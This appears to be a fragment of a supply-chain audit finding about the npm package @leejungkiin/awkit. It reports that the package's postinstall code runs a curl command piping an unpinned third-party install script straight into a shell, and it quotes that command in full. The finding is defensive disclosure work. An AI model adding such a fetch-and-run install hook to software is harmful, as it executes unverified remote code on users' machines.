  "summary": "Postinstall executes curl-piped shell script from third-party GitHub repository",
  "details": "scripts/dependency-manager.js executes `execSync('curl -fsSL https://raw.githubusercontent.com/rtk-ai/rtk/refs/heads/master/install.sh | sh')`, fetching and running a shell script from a mutable master branch of an unrelated third-party GitHub repository (`rtk-ai/rtk`) at install time. The script pulls content over an unpinned mutable branch with no hash or signature verification, and pipes the response directly into a shell for execution. Additional network activity in the same file contacts `https://www.rtk-ai.app` and `https://api.github.com`. The package name (`@leejungkiin/awkit`) does not correspond to the `rtk-ai` publisher whose install script is being executed, so lifecycle installation of this package runs arbitrary code controlled by a third party.",
